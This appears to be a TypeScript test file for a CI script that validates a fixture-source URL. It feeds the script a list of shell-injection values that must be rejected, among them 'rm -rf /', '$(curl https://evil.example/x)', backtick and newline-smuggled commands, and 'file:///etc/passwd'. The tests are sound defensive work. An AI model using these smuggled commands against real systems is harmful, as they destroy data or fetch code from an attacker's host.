/**
 * PS-6 Lane B fixture-source validation — adversarial checks (SIR-PS6-002
 * correction). The workflow passes the workflow_dispatch input through
 * workflow env plumbing (data, never shell syntax); the committed
 * validation script must reject every shell-injection shape BEFORE any
 * curl. This test exercises the script's built-in adversarial self-test
 * and a few direct cases through the same script.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const SCRIPT = join(fileURLToPath(new URL('..', import.meta.url)), '..', '..', 'scripts', 'ci-validate-fixture-source.sh');

function validate(value: string): { readonly code: number; readonly stdout: string; readonly stderr: string } {
  const run = spawnSync('bash', [SCRIPT, value], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  return { code: run.status ?? -1, stdout: run.stdout ?? '', stderr: run.stderr ?? '' };
}

test('fixture-source validation: the committed self-test covers every required adversarial shape', () => {
  const run = spawnSync('bash', [SCRIPT, '--selftest'], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  assert.equal(run.status, 0, run.stdout + run.stderr);
  assert.ok((run.stdout ?? '').includes('all adversarial'), run.stdout);
});

test('fixture-source validation: valid https URL is accepted', () => {
  const ok = validate('https://example.org/fixtures/ps6-fixtures-0.1.0.tgz');
  assert.equal(ok.code, 0, ok.stderr);
});

test('fixture-source validation: adversarial values fail closed (quote, $(), backticks, semicolon, newline, whitespace, scheme)', () => {
  const adversarial = [
    'http://example.org/x.tgz',
    'https://example.org/x.tgz;rm -rf /',
    'https://example.org/x.tgz$(id)',
    'https://example.org/x.tgz$(curl https://evil.example/x)',
    'https://example.org/`id`.tgz',
    'https://example.org/x.tgz" || touch /tmp/injected',
    "'https://example.org/x.tgz'",
    'https://example.org/x y.tgz',
    'https://example.org/x.tgz\ncurl https://evil.example/x',
    'https://example.org/x.tgz\t',
    'https://example.org/x.tgz?a=b&c=d',
    'https://example.org/x.tgz#frag',
    'ftp://example.org/x.tgz',
    'file:///etc/passwd',
    'https://example.org/x.tgz | tee /tmp/x',
    'https://example.org/x.tgz < /dev/null',
    'https://example.org/x.tgz && true',
    'https://example.org/x.tgz || true',
  ];
  for (const value of adversarial) {
    const run = validate(value);
    assert.equal(run.code, 2, `must be rejected: ${JSON.stringify(value)} (${run.stdout} ${run.stderr})`);
  }
});

test('fixture-source validation: empty value is rejected', () => {
  assert.equal(validate('').code, 2);
});
